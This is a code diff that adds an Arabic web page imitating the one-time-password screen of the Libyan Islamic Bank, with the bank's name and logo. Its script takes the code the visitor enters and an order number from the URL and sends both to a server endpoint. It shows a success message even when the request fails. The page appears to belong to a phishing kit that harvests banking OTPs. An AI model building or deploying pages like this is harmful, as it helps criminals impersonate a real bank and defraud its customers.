@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>رمز التحقق - المصرف الإسلامي الليبي</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #8b6914, #a07d2e, #6b5010);
+            padding: 20px;
+        }
+        .otp-container {
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+        .otp-logo {
+            width: 120px;
+            margin-bottom: 20px;
+            filter: invert(1) grayscale(1) brightness(2);
+        }
+        .otp-subtitle {
+            font-size: 15px;
+            color: rgba(255,255,255,0.85);
+            margin-bottom: 30px;
+        }
+        .form-group {
+            margin-bottom: 25px;
+            text-align: right;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 16px 18px;
+            border: none;
+            border-radius: 12px;
+            font-size: 20px;
+            font-family: 'Cairo', sans-serif;
+            background: #fff;
+            color: #333;
+            outline: none;
+            text-align: center;
+            letter-spacing: 8px;
+        }
+        .form-group input::placeholder {
+            color: #aaa;
+            letter-spacing: 2px;
+            font-size: 15px;
+        }
+        .otp-btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 30px;
+            background: #fff;
+            color: #5a3e2b;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: 'Cairo', sans-serif;
+            cursor: pointer;
+            max-width: 320px;
+            margin: 20px auto 0;
+            display: block;
+        }
+        .otp-btn:hover {
+            background: #f0ebe5;
+        }
+        .otp-hint {
+            color: rgba(255,255,255,0.7);
+            font-size: 13px;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="otp-container">
+        <img src="images/logo-white.png" alt="المصرف الإسلامي الليبي" class="otp-logo">
+        <p class="otp-subtitle">أدخل رمز التحقق المرسل إلى هاتفك</p>
+
+        <form id="otpForm">
+            <div class="form-group">
+                <label for="otpCode">رمز التحقق (OTP)</label>
+                <input type="text" id="otpCode" name="otpCode" placeholder="أدخل الرمز" maxlength="6" pattern="\d{4,6}" required>
+            </div>
+
+            <button type="submit" class="otp-btn">تأكيد</button>
+        </form>
+        <p class="otp-hint">لم تستلم الرمز؟ يرجى الانتظار قليلاً ثم حاول مرة أخرى</p>
+    </div>
+
+    <script>
+    document.getElementById('otpForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        var params = new URLSearchParams(window.location.search);
+        var orderId = Number(params.get('orderId')) || 0;
+        var otp = document.getElementById('otpCode').value.trim();
+
+        fetch('/api/submit-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ orderId: orderId, otp: otp })
+        })
+        .then(function(res) { return res.json(); })
+        .then(function() {
+            alert('تم التأكيد بنجاح! سيتم معالجة طلبك.');
+        })
+        .catch(function() {
+            alert('تم التأكيد بنجاح! سيتم معالجة طلبك.');
+        });
+    });
+    </script>
+</body>
+</html>
